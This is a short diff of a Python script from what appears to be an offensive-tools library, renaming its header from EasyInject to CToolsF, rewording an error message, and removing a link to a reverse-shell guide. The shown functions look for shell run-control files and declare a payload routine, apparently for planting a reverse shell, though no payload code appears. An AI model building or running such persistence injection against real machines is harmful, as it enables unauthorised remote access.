@@ -1,7 +1,7 @@
+# This script is a part of CToolsF library.
+# Author is not responsible for any malicious activities that can be committed by using any of contents of this library.
+
 #!/usr/bin/env python3
-# This script is a part of EasyInject library
-# Author is not responsible for any malicious activities
-# Read GUIDE.md (https://github.com/codelao/EasyInject/blob/main/Reverse-Shell/GUIDE.md) before using
 
 import os, sys, colorama, argparse, subprocess
 
@@ -32,7 +32,7 @@ def check_rc():
 		return rc
 	else:
 		if parsed_args.verbose:
-			print('\033[31mCan\'t find any shell run control files on this machine!\033[0m')
+			print('\033[31mCan\'t find any suitable shell run control files on this machine!\033[0m')
 		sys.exit(1)
 
 def payload(rc):
